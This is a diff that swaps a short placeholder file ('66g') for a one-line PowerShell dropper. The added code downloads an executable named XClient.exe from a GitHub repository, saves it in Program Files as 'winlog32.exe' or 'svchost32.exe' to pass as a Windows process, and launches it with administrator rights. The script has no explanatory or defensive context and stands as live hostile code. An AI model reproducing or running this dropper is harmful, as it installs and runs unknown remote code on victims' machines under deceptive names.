@@ -1,2 +1,1 @@
-# 66g
-66g
+$settings = '{"WD": false, "adminrun": false}'; if ($settings.adminrun) { $outputPath = Join-Path $env:programfiles 'winlog32.exe'; (New-Object System.Net.WebClient).DownloadFile("https://github.com/k9g4/7g6/blob/main/XClient.exe", $outputPath); Start-Process $outputPath -Verb RunAs } else { $outputPath = Join-Path $env:programfiles 'svchost32.exe'; (New-Object System.Net.WebClient).DownloadFile("https://github.com/k9g4/7g6/blob/main/XClient.exe", $outputPath); Start-Process $outputPath -Verb RunAs };
